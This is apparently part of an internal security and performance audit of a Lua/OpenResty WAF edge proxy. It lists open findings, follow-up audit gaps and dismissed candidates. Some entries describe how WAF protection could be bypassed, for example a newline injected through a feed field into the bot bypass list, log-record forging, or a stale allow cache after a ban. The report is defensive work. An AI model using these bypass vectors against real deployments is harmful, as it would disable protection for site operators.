**Suggested fix.** Add a memoized get_norm_args() in _M.check and pass it as the precomputed _s/_ns arg these detectors already accept.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f59"></a>
### F59 — Five RCE-marker detectors each rebuild lower(cap(body)) + concat on every POST body

- **Status:** ☐ open
- **Severity:** low · **Category:** perf (axis b) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:2423`

**What & why.** detect_reverse_shell(2400) and search_rce_markers used by detect_persistence/detect_rootkit_artifacts/detect_lolbin/detect_coinminer(2423) each independently build s = scan_ua..' '..lower(cap(body,max_scan_len)) when a body is present. scan_ua is shared but the lowered+capped body slice and the concat are recomputed 5 times per request (5x lower() over up to 2KB + 5x concat allocation), all five detectors active (logonly/challenge) — GC churn scaling with POST volume, and the lowered body is byte-identical across all five.

**Repro / cost.** A POST with a 2KB body executes lower(cap(body,2048)) and a full concat 5 times, producing ~5 redundant 2KB lowercase allocations and ~5 redundant ~4KB concat allocations for one request.

**Suggested fix.** Compute body_lc = lower(cap(body,max_scan_len)) once in _M.check and pass it into search_rce_markers/detect_reverse_shell, collapsing 5 lower+concat passes into 1.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f60"></a>
### F60 — cfm_origin_ka emits a false "OpenResty too old / HTTPS pooling off" NOTICE and burns the one-shot warn flag when $host is empty

- **Status:** ☐ open
- **Severity:** low · **Category:** correctness (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_origin_ka.lua:172`

**What & why.** In _M.balance(443) the guard `if sni_pool_ok and host ~= '' then ... elseif not warned_no_sni_pool then <log 'needs OpenResty 1.27.1.1+; HTTPS origin connections stay per-request'>` conflates two conditions: genuinely lacking SNI-pool support vs sni_pool_ok true but $host empty. In the empty-host case the worker fully supports SNI pooling yet logs the misleading 'lua-resty-core too old' NOTICE and permanently consumes the once-per-worker warn latch. docs tell operators to grep for [cfm_origin_ka] after enabling, so this makes them wrongly conclude pooling is disabled fleet-wide. Reachability is low (server_name '_' usually resolves $host to '_').

**Repro / cost.** On a worker with sni_pool_ok=true, a 443 request whose $host resolves to '' takes the elseif and logs the 'needs OpenResty 1.27.1.1+' NOTICE despite pooling working.

**Suggested fix.** Split the conditions so the 'no SNI support' NOTICE fires only when sni_pool_ok is false; treat host=='' as its own silent/distinct case.

**Fix landed:** _(pending — record commit/PR here)_

---

## Info

<a id="f61"></a>
### F61 — server_tokens not disabled — proxy version leaked in Server header and error pages

- **Status:** ☐ open
- **Severity:** info · **Category:** security (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/openresty.conf:80`

**What & why.** Neither config sets server_tokens off;, so the http{} default (on) applies and the proxy emits its version in the Server response header and default error pages. In DNAT-direct mode (no Cloudflare stripping the header) this leaks the OpenResty/Angie version to any client. Trivial to fix, applies to both files.

**Repro / cost.** curl -I http://edge:9080/ -> Server: openresty/<version>.

**Suggested fix.** Add server_tokens off; in the http{} block of both configs.

**Fix landed:** _(pending — record commit/PR here)_

---

## Coverage gaps — follow-up audit tasks

Surfaces the completeness critic flagged as under-covered. Treat the three **high**
gaps as their own audit tasks.

- [ ] **[low] F10b — port `[...]` bracket-class globs into the Lua exclude matcher** (`cfm_waf_excl.lua` `glob_to_lua_pattern` + the `matches_rule` glob trigger)
  - Follow-up to F10. The security-critical `*`/`?` cross-`/` widening is fixed; what remains is that Go treats a value containing `[`/`]` as a glob character class (`compileValueMatcher`: `ContainsAny(rule, "*?[]")`) while Lua only glob-detects `*`/`?` and matches `[`/`]` literally. Mostly Lua-**narrower** (more protective in-path), except one contrived *wider* case — a request literally containing the bracket text (rule `/foo[abc]`, request `/foo[abc]`) matches in Lua but not Go (needs literal, usually percent-encoded, brackets in both rule and URL). Port Go's `globToRegex` bracket handling (incl. `[!`/`[^`→`[^…]` negation, `]`-as-first-char literal, Lua set-escaping of `%`/`]`) and add cross-engine tests. Low priority (bracket-class excludes are rare).
  - **Investigated 2026-07-10:** confirmed **low, safe to defer** — no in-path WAF-off widening. For bracket rules Lua is strictly-or-mostly **narrower** (in-path WAF stays ON where Go would skip); the only Lua-wider corners (request literally containing the bracket text; a lone `]`) require operator-configured literal brackets and are negligible. A full char-by-char port plan for `glob_to_lua_pattern` (class state machine, `[!`/`[^` negation, leading-`]` literal, Lua set-escaping) + lock-step cross-engine test rows are scoped and ready to drop in whenever this is picked up; two Go quirks (`\\]`/`\\^` in `globToRegex`, lines ~501/521) should NOT be replicated — flag Go-side instead.
- [x] **[high]** configs/angie.conf (whole file, 62KB, edited 2026-07-08) — no dedicated finder — **audited, at parity**
  - Every edge-config finding cites openresty.conf; angie.conf was never audited as a first-class proxy. Needed a line-by-line openresty↔angie parity diff.
  - **Investigated 2026-07-10:** **full parity, no exposure.** A path-normalized diff + landmark greps confirm every security-critical directive is byte-identical across both angie server blocks: F06 static-asset negative-lookahead (angie 673/1139), F01 admin `auth_request`→`/api/v1/admin/authcheck` (863/1314), the `map $http_x_forwarded_proto $cf_xfp` + all XFP-to-origin lines, `__ssl_debug` loopback gate, `real_ip_header`/`recursive`/`trusted_proxies` include, `geo $cfm_bypass_ip`, `access_by_lua_file cfm.lua` (×2), and the full set of 18 `access_by_lua_block { return; }` bypass locations. The only diffs are comments, install paths, required `load_module` lines, and a cosmetic `@cfm_admin_upstream_error_https` rename — no security-relevant DRIFT, no ABSENT item. It was a **process** gap, not an exposure. Optional follow-up: a CI guardrail asserting each edge fix is present in both configs so future one-sided fixes are caught. (The shared `$cf_xfp` = client-supplied XFP default is a property of both proxies = the separate F44 low finding, not a parity gap.)
- [x] **[high]** Verified-bot geo bypass: cfm.lua:1168 `if ngx.var.cfm_bypass_ip == "1" then return` + trusted_proxies.conf + real_ip_header CF-Connecting-IP/real_ip_recursive — **audited, trust chain sound**
  - cfm_bypass_ip==1 returns early sending straight to origin, fully skipping BOTH WAF and challenge. `geo $cfm_bypass_ip` is keyed on the implicit $remote_addr (the real_ip-substituted address). The strongest possible bypass in the whole edge rests on the real_ip trust chain — is it spoofable?
  - **Investigated 2026-07-10:** **no spoof→bypass vector.** `geo` keys on `$remote_addr`, which the realip module rewrites from `CF-Connecting-IP` **only when the connection's peer is inside `set_real_ip_from`** — and `trusted_proxies.conf` holds Cloudflare ranges only (no loopback, no catch-all). DNAT is port-only (`nft/dnat.go`: no SNAT/masquerade), so a direct external attacker's peer is their real IP, not in the trusted set → their forged `CF-Connecting-IP` is ignored and `$remote_addr` stays un-spoofable. Behind Cloudflare, CF overwrites `CF-Connecting-IP` with the true client IP. `real_ip_recursive on` only walks multi-value headers *after* the peer is already trusted, so it adds no vector. Residual (config-hygiene, small follow-up): soundness rests on operators keeping the edge `set_real_ip_from` Cloudflare-scoped — a lint/post-deploy assert that it contains no `0.0.0.0/0`/`::/0`/loopback (plus a warning in `trusted_proxies.conf`, mirroring the one already in `docs/dnat-bypass.md` for the DNAT bypass file) would harden it. The *content* risk (an over-broad bot prefix) is the generator gap above — now hardened.
- [x] **[high]** challenge_waf_bypass.conf (2790 lines, auto-generated) + its generator — **hardened**
  - This bot-IP allowlist directly disables WAF+challenge for every prefix it contains (via cfm_bypass_ip). It is machine-generated from external JSON/txt feeds (google/bing/koalityengine tools.koalityengine.com/ip.txt, asn-* RIPE lookups). No finder audited the generator, the feed-trust model, staleness, or malformed-line handling. A single bad/overbroad prefix (e.g. a whole hosting ASN, or a compromised/typosquatted feed URL) silently turns off protection for large IP space; a parse error could fail-open the entire geo block.
  - **Investigated 2026-07-10 (§5 correction):** there is **no Go generator** — the file is produced by a standalone Python script, `scripts/build_bypass_list.py`, run manually and committed. Deployment is manual + git-reviewed, and the nginx side is fail-closed (`geo … default 0`), which mitigates a lot; but the generator itself was unbounded. Confirmed risks: (R1) `normalize_prefix` validated CIDR *syntax only* — no breadth floor, no private/reserved filter, no count cap, so `0.0.0.0/0` or a `/8` from any feed would become `<cidr> 1;` and globally disable protection; (R3) feed-controlled JSON `creationTime` written verbatim into a `#` comment → an embedded newline could inject a standalone `0.0.0.0/0 1;` directive; (R2) untrusted third-party feeds with no pinning; (R4/R5) non-atomic write, partial-run overwrite, staleness.
  - **Fix landed:** `build_bypass_list.py` now (R1) rejects non-public ranges (`0.0.0.0/0`/`::/0`, RFC1918/loopback/link-local/multicast/reserved) and anything broader than the shipped floors (IPv4 `/16`, IPv6 `/32` — 0 current prefixes dropped), with per-source + total count caps that abort the run; (R3) sanitises all metadata (strip CR/LF/control) before writing; (R4) writes atomically (temp + fsync + rename) and refuses to replace the list if the new one is < MIN or a >50% shrink vs the existing (keeps last-good). The default output now resolves to the authoritative `configs/challenge_waf_bypass.conf`, and the unused duplicate `scripts/challenge_waf_bypass.conf` was removed. New offline guardrail `scripts/tests/check_bypass_list.sh` (+ `bypass_list_test.py`) unit-tests the bounds/sanitiser/guard and re-validates the **committed** file with the generator's own `normalize_prefix` (no drift, no network); wired into `security.yml`, `/preflight`, and CLAUDE.md §3. `make release` wiring intentionally deferred (may move the whole concept into the Go binary later). PR #1057.
- [ ] **[medium]** configs/lua/log-cfm.lua (155 lines, log_by_lua deferred socket send)
  - The Lua producer of the log-ingest pipeline was not clearly assigned (go-ingest-wafhit covered ingest_socket.go, the consumer). log-cfm.lua builds a log line from request fields and ships it over the unix socket in an ngx.timer.at(0) callback. Unaudited: whether attacker-controlled fields (UA, URI, referer, host) are escaped before being concatenated into the delimited line the Go parser splits — a raw delimiter/newline in a header would forge or split ingest records feeding the detector scoring (log injection → false autoblocks or evasion). Also the timer-per-log-line cost and drop behaviour under load.
- [ ] **[medium]** Decision cache (decision_cache_ttl_ms=90000) vs. block/ban state changes
  - cfm.lua caches clean-allow verdicts for 90s in cfm_decisions. The interaction the prompt flags — an IP that the daemon blocks/nft-bans/escalates-to-challenge WITHIN that 90s window — was never audited. If nothing invalidates the cached allow on a state change (autoblock fire, manual block, waf_security ban, clearance revocation), a just-banned attacker keeps getting served at the edge for up to 90s. Check whether the bridge/daemon pushes cache invalidation or version-bumps the dict, or whether block state is only consulted on cache-miss.
- [ ] **[medium]** balancer_by_lua upstream selection: openresty.conf:468/480, cfm.lua origin_pass_for/cfm_upstream, cfm_origin_ka.balance()
  - Origin peer selection (set_current_peer(server_addr,80/443)) and the cfm_upstream/cfm_pass vars set in cfm.lua were only touched via the origin-keepalive cluster. SSRF-via-origin-selection was named as an audit axis but not resolved: verify the upstream address always comes from $server_addr (bound listener) and never from a client-controllable header ($host/Host) in either DNAT-direct or proxied mode, and that the placeholder `server 0.0.0.1` can never be reached if balancer_by_lua errors (fail-closed vs. connecting to 0.0.0.1).
- [ ] **[medium]** cfm_filecache.lua (109 lines) — the per-worker file-cache module underpinning excludes/token caches
  - Named repeatedly in cfm.lua as the fix for the access_by_lua local-reset pitfall, but its own stat/mtime cadence and staleness bounds weren't independently verified. It backs security-relevant config (WAF excludes, tokens). If its invalidation is mtime-only and mtime can equal across a same-second rewrite (the exact 'timestamp-equality shortcut' hazard cfm.lua's comments allude to), a stale excludes/token set persists per worker until reload — silently widening or narrowing protection. Confirm it detects same-second content changes (size/inode, not just mtime).
- [ ] **[medium]** cfm-panel-listeners.conf.in (357-line templated panel listener config) + SNI fallback cert path
  - The cPanel token-transport audit stayed in Lua (cfm_panel*.lua). The generated per-port HTTPS panel listener template was not audited: whether each panel listener wires cfm.lua/WAF at all (a listener that skips access_by_lua is an unprotected admin surface), its per-port real_ip config, and the explicit fallback ssl_certificate (selfsigned) behaviour on SNI miss. On a shared host a mis-templated listener port is a direct auth/scope or cert-confusion surface.
- [ ] **[medium]** TLS/SNI edge: ssl_certificate_by_lua on cache-miss/parse-failure + selfsigned fallback (openresty.conf:992 / angie.conf:974)
  - sslcollector.lua findings covered per-handshake re-parse cost and cache-miss WARN spam, but not the correctness of the miss path: when SNI has no cached cert or the PEM fails to parse, does the handshake fail-closed, serve the shared selfsigned, or risk serving another tenant's cached cert? On shared hosting a wrong-cert/cross-tenant handshake is a confidentiality issue. Also whether an attacker-driven flood of unknown-SNI handshakes forces unbounded parse work (DoS).
- [ ] **[medium]** Proxy real_ip drift: angie.conf uses real_ip_header CF-Connecting-IP/recursive on at http level, while openresty relies on nginx-cfm.conf X-Real-IP/recursive off + nginx-cpanel-server-realip.conf server-level override
  - The two proxies disagree on WHICH header establishes the client IP, and nginx-cpanel-server-realip.conf documents that a server-level real_ip_header fully overrides the http-level one. This directly governs the trust boundary behind every XFF/CF-Connecting-IP spoofing finding, yet the real_ip config files themselves were never audited. A spoofing fix validated on one proxy/header can be void on the other; and the server-level-override interaction means the authoritative header differs per vhost. Needs an explicit 'which header is trusted, from which peers, on each proxy and each server block' matrix.
- [ ] **[low]** init_worker_by_lua bootstrap window (openresty.conf/angie.conf ~102-130) and its +2s retry
  - The bootstrap (self-IP snapshot, bridge token/config load) runs via ngx.timer.at(0) with a +2s retry on failure. No finder examined request handling DURING the window before the first timer completes: does cfm.lua fail-open or fail-closed if a request arrives before self-IPs/ignore-nets/bridge-token snapshots are populated (empty snapshot could either block self-traffic or skip protection). Worth confirming the empty-snapshot default and whether the retry can loop-fail silently.
- [ ] **[low]** cfm_cache_log.lua (71 lines) and cfm_purge purge-all interactions beyond the single force-unblock finding
  - purge-cachelog-stats cluster produced findings for cfm_stats and cfm_purge force-unblock, but cfm_cache_log.lua (cache logging/telemetry) got no cited finding. Small file, but it runs on request/log path; verify it isn't doing per-request dict writes or unbounded string building. Low impact but genuinely unexamined in the surviving-findings set.

---

## Dismissed after adversarial verification

Candidate findings a skeptical second pass refuted against the actual code — kept for
the record so the audit is auditable.

- **F18** · `configs/lua/cfm_clamav.lua:118` — cfm_clamav blocks the nginx access phase on a synchronous unix round-trip (fresh connection + blocking receive) per scanned upload
- **F23** · `internal/webdetector/nginx_bridge.go:1546` — handleDecision scans the entire vhState map on every non-exact-host request (O(n) on the hot path)
- **F29** · `configs/lua/cfm.lua:693` — http_unix calls setkeepalive() after a failed/partial body read, poisoning the pooled socket (response desync) and returning (nil,nil) on truncation
- **F42** · `configs/lua/cfm_panel_tunnel.lua:194` — Tunnel loopback allowlist / TLS-verify guard is skipped entirely for plaintext (http://) origins
- **F50** · `internal/webdetector/nginx_bridge.go:2193` — Bridge token compared with non-constant-time == (timing side channel)
- **F53** · `internal/sslcollector/reload_edge.go:80` — socketReady() hardcodes the default socket path, so the cold-boot edge nudge never fires under a custom SSLCOLLECTOR_SOCK_PATH

